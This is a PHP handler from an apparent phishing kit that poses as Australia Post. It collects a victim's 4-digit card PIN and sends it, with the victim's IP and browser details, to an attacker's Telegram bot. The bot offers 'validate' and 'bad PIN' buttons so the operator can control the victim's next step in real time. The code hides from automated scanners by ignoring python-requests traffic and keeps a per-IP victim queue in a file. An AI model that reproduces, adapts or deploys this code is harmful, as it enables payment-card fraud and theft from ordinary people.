<?php
session_start();
include '../settings.php';
include '../lang_main.php';
require_once dirname(__DIR__) . '/antibot.php';
validateSession(4);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $pin = htmlspecialchars(trim($_POST["pin"] ?? ''));
    // Accept only 4-digit PIN
    if (!preg_match('/^\d{4}$/', $pin)) {
        header("Location: ../success2.php?error=1");
        exit();
    }

    $userIP    = $_SERVER['REMOTE_ADDR'];
    $userAgent = $_SERVER['HTTP_USER_AGENT'];

    if (stripos($userAgent, 'python-requests') === false) {
        $message = "🇦🇺 <b>AUSTRALIA POST - PIN RECEIVED</b> 📌\n" .
                   "━━━━━━━━━━━━━━━━━━\n" .
                   "🔐 <b>PIN :</b> <code>$pin</code>\n" .
                   "━━━━━━━━━━━━━━━━━━\n" .
                   "🌐 IP : <code>$userIP</code>\n" .
                   "🖥️ UA : <i>$userAgent</i>";

        $protocol    = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
        $host        = $_SERVER['HTTP_HOST'];
        $current_dir = dirname($_SERVER['PHP_SELF']);
        $root_dir    = dirname($current_dir);
        if ($root_dir == '/' || $root_dir == '\\') $root_dir = '';

        $base_url        = $protocol . "://" . $host . $root_dir;
        $vbv_action_url  = $base_url . "/security_check/actionsvbv.php";
        $vbv_action_url  = str_replace('//security_check', '/security_check', $vbv_action_url);

        $encoded_ip     = urlencode($userIP);
        $validate_link  = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=pinvalid";
        $bad_pin_link   = $vbv_action_url . "?ip=" . $encoded_ip . "&otp=pinbad";

        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '✅ VALIDER PIN', 'url' => $validate_link],
                    ['text' => '❌ MAUVAIS PIN',  'url' => $bad_pin_link]
                ]
            ]
        ];

        sendTelegramMessage($botToken, $chatId, $message, $keyboard);
    }

    // Reset old IP entries and set pinwaiting
    $ipListFile = '../security_check/ip_list.txt';
    if (file_exists($ipListFile)) {
        $lines  = file($ipListFile);
        $output = [];
        foreach ($lines as $line) {
            if (strpos($line, $userIP) === false) {
                $output[] = $line;
            }
        }
        file_put_contents($ipListFile, implode("", $output));
    }
    file_put_contents($ipListFile, PHP_EOL . $userIP . ",pinwaiting", FILE_APPEND | LOCK_EX);

    header("Location: ../pin_verify.php");
    exit();
}

header("Location: ../success2.php");
exit();
?>
